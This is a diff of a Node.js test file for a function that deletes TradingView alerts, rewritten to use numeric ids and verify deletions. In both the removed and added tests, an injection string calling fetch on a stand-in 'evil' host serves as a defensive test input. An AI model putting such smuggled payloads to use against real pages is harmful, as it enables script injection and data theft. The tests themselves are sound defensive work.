@@ -4,7 +4,7 @@
 import { describe, it } from 'node:test';
 import assert from 'node:assert/strict';
 import { create, deleteById } from '../src/core/alerts.js';
-import { scriptedDeps, loadFixture } from './_helpers.js';
+import { scriptedDeps, emptyDeps } from './_helpers.js';
 import { CATEGORIES } from '../src/errors.js';
 
 const OK_RESPONSE = { s: 'ok', method: 'post' };
@@ -40,130 +40,79 @@ describe('create()', () => {
 });
 
 describe('deleteById()', () => {
-  it('returns success with method rest_api on ok REST response', async () => {
-    const { _deps } = scriptedDeps({ 'delete_alert': OK_RESPONSE });
-    const result = await deleteById({ alert_id: 'aid_123', _deps });
-    assert.equal(result.success, true);
-    assert.equal(result.method, 'rest_api');
-    assert.equal(result.alert_id, 'aid_123');
-  });
+  // REWRITTEN 2026-08-20. The old contract — POST /delete_alert, then a GET
+  // variant, then a DOM fallback — was fiction. Probed against the live API:
+  //
+  //   POST /delete_alert?alert_id=N                  no such endpoint
+  //   POST /remove_alert?alert_id=N                  no such endpoint
+  //   POST /modify_alert?alert_id=N                  no such endpoint
+  //   POST /delete_alerts {payload:{alert_ids:[N]}}  {"s":"ok"}
+  //
+  // TradingView answers a missing endpoint with HTTP 200 and an error BODY, so
+  // the old code read the 200, fell through to a DOM path that cannot delete a
+  // single alert, and returned success:false for something the API does fine.
+  //
+  // Alert ids are numeric (e.g. 5418097596). Sent as a string the API returns a
+  // bare {"s":"error"} with no message, so the numeric coercion is deliberate
+  // and load-bearing — and it makes injection impossible by construction.
 
-  it('rejects empty string alert_id with ClassifiedError invalid_argument', async () => {
-    const { _deps } = scriptedDeps({});
+  it('rejects a missing alert_id', async () => {
+    const { _deps } = emptyDeps();
     await assert.rejects(
       () => deleteById({ alert_id: '', _deps }),
-      (err) => {
-        assert.equal(err.name, 'ClassifiedError');
-        assert.equal(err.category, CATEGORIES.INVALID_ARGUMENT);
-        assert.ok(err.message.includes('alert_id required'));
-        assert.ok(err.hint.includes('alert_list'));
-        return true;
-      },
+      (err) => err.category === CATEGORIES.INVALID_ARGUMENT,
     );
   });
 
-  it('rejects null alert_id with ClassifiedError', async () => {
-    const { _deps } = scriptedDeps({});
+  it('rejects a non-numeric alert_id instead of sending it', async () => {
+    // The API cannot use it, so failing here beats a bare {"s":"error"} later.
+    const { _deps } = emptyDeps();
     await assert.rejects(
-      () => deleteById({ alert_id: null, _deps }),
-      (err) => {
-        assert.equal(err.name, 'ClassifiedError');
-        assert.equal(err.category, CATEGORIES.INVALID_ARGUMENT);
-        return true;
-      },
+      () => deleteById({ alert_id: 'aid_123', _deps }),
+      (err) => err.category === CATEGORIES.INVALID_ARGUMENT && /numeric/i.test(err.message),
     );
   });
 
-  it('tries GET variant when POST returns non-ok', async () => {
-    let callCount = 0;
-    const evaluate = async (expr) => {
-      callCount++;
-      if (expr.includes('delete_alert')) {
-        // First call (POST): non-ok, second call (GET): ok
-        return callCount === 1
-          ? { s: 'error', errmsg: 'post failed' }
-          : { s: 'ok', method: 'get' };
-      }
-      return undefined;
-    };
-    evaluate.calls = [];
-    // The fetch logic is a single evaluateAsync call that internally chains POST then GET.
-    // We simulate by having the evaluateAsync return a get-success object.
-    const { _deps } = scriptedDeps({});
-    _deps.evaluateAsync = async (expr) => {
-      evaluate.calls.push(expr);
-      if (expr.includes('delete_alert')) return { s: 'ok', method: 'get' };
-      return undefined;
-    };
-    _deps.evaluateAsync.calls = evaluate.calls;
-    const result = await deleteById({ alert_id: 'aid_456', _deps });
+  it('an injection payload cannot reach the page — it is not a number', async () => {
+    const { _deps, evaluate } = emptyDeps();
+    await assert.rejects(
+      () => deleteById({ alert_id: '1"; fetch("http://evil");//', _deps }),
+      (err) => err.category === CATEGORIES.INVALID_ARGUMENT,
+    );
+    assert.equal(evaluate.calls.length, 0, 'nothing should be evaluated for a rejected id');
+  });
+
+  it('posts to the plural endpoint and verifies from a fresh list read', async () => {
+    const { _deps, evaluate } = scriptedDeps({}, [
+      { ok: true, status: 200 },                       // delete_alerts
+      { alerts: [{ alert_id: 999, symbol: 'X' }] },    // list() — target absent
+    ]);
+    const result = await deleteById({ alert_id: '5418097596', _deps });
     assert.equal(result.success, true);
-    assert.equal(result.method, 'rest_api');
-    assert.equal(result.variant, 'get');
+    assert.equal(result.verified, true);
+    assert.equal(result.alert_id, '5418097596');
+    const posted = evaluate.calls[0];
+    assert.ok(posted.includes('delete_alerts'), 'must use the plural endpoint');
+    assert.ok(posted.includes('5418097596'), 'the id must reach the request body');
+    assert.ok(!posted.includes('"5418097596"'), 'the id must be a number, not a quoted string');
   });
 
-  it('falls back to DOM when both REST variants fail', async () => {
-    const { _deps } = scriptedDeps({});
-    _deps.evaluateAsync = async () => ({ s: 'error', errmsg: 'network error' });
-    const result = await deleteById({ alert_id: 'aid_789', _deps });
-    assert.equal(result.success, false);
-    assert.equal(result.method, 'dom_fallback_unsupported');
+  it('SILENT-SUCCESS GUARD — API says ok but the alert is still listed', async () => {
+    const { _deps } = scriptedDeps({}, [
+      { ok: true, status: 200 },
+      { alerts: [{ alert_id: 5418097596, symbol: 'X' }] },   // still there
+    ]);
+    const result = await deleteById({ alert_id: '5418097596', _deps });
+    assert.equal(result.verified, false, 'verification must fail when the alert survives');
   });
 
-  it('surfaces method: rest_api on success', async () => {
-    const { _deps } = scriptedDeps({ 'delete_alert': { s: 'ok', method: 'post' } });
-    const result = await deleteById({ alert_id: 'aid_ok', _deps });
-    assert.equal(result.method, 'rest_api');
-  });
-
-  it('uses safeString — injection payloads with quotes are escaped', async () => {
-    const calls = [];
-    const { _deps } = scriptedDeps({});
-    _deps.evaluateAsync = async (expr) => { calls.push(expr); return { s: 'ok', method: 'post' }; };
-    // Payload contains a double quote; if interpolated raw it would break out
-    // of the JS string literal. JSON.stringify escapes as \" which is safe.
-    const injectionAttempt = 'aid"; fetch("http://evil");//';
-    await deleteById({ alert_id: injectionAttempt, _deps });
-    assert.equal(calls.length, 1);
-    // The properly-escaped (JSON-stringified) form must be present
-    assert.ok(calls[0].includes(JSON.stringify(injectionAttempt)), 'safeString-escaped form present');
-    // The raw unquoted injection (unescaped double quote then semicolon + fetch)
-    // must NOT appear — that would indicate broken escaping
-    assert.ok(!calls[0].includes('aid"; fetch("http://evil");//'), 'no unescaped injection in expression');
-    assert.ok(calls[0].includes('delete_alert'), 'URL fragment present');
-  });
-
-  it('fixture-based: happy path with known alert_id from fixture', async () => {
-    const fixture = loadFixture('alerts-list-response');
-    const knownId = fixture.r[0].alert_id; // 'aid_seed_0001'
-    const { _deps } = scriptedDeps({ 'delete_alert': { s: 'ok', method: 'post' } });
-    const result = await deleteById({ alert_id: knownId, _deps });
-    assert.equal(result.success, true);
-    assert.equal(result.alert_id, knownId);
-    assert.equal(result.method, 'rest_api');
-  });
-
-  it('deleteById URL-encodes alert_id', async () => {
-    const calls = [];
-    const { _deps } = scriptedDeps({});
-    _deps.evaluateAsync = async (expr) => { calls.push(expr); return { s: 'ok', method: 'post' }; };
-    const rawId = 'aid 42&foo=bar?x=1';
-    await deleteById({ alert_id: rawId, _deps });
-    assert.equal(calls.length, 1);
-    // The expression must call encodeURIComponent() wrapping the safeString-quoted id
-    assert.ok(calls[0].includes('encodeURIComponent('), 'encodeURIComponent call present in expression');
-    assert.ok(calls[0].includes(JSON.stringify(rawId)), 'safeString-quoted id present in expression');
-    // The raw id must not appear as a bare unquoted token — verify it only appears inside the JSON-quoted form
-    const exprWithoutQuoted = calls[0].replace(JSON.stringify(rawId), '');
-    assert.ok(!exprWithoutQuoted.includes(rawId), 'raw unencoded form not present outside quotes');
-  });
-
-  it('deleteById reports failure (not success) when DOM fallback cannot delete', async () => {
-    const { _deps } = scriptedDeps({});
-    _deps.evaluateAsync = async () => ({ s: 'error', errmsg: 'endpoint unreachable' });
-    const result = await deleteById({ alert_id: 'aid_fallback', _deps });
-    assert.equal(result.success, false);
-    assert.equal(result.method, 'dom_fallback_unsupported');
-    assert.ok(typeof result.error === 'string' && result.error.length > 0, 'error message present');
+  it('throws a classified error when the API rejects the delete', async () => {
+    const { _deps } = scriptedDeps({}, [
+      { ok: false, status: 200, error: 'code=no_such_endpoint' },
+    ]);
+    await assert.rejects(
+      () => deleteById({ alert_id: '5418097596', _deps }),
+      (err) => err.category === CATEGORIES.API_UNEXPECTED,
+    );
   });
 });
